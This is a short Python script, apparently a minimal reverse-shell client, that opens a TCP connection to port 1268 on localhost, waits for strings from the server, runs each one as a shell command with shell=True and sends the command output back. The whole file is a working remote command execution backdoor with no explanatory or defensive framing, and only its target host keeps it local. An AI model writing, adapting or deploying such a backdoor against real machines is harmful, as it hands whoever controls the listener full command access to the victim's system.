import socket
import os
import sys
import subprocess

ip = socket.gethostname()
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((socket._LOCALHOST, 1268))

print("connected")

while True:
    data = server.recv(1024).decode("utf-8")

    if len(data) > 0:
        try:
            proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            out, err = proc.communicate()
            print("client : ",out)
            server.send(out)
        except Exception as e:
            print("error", e)




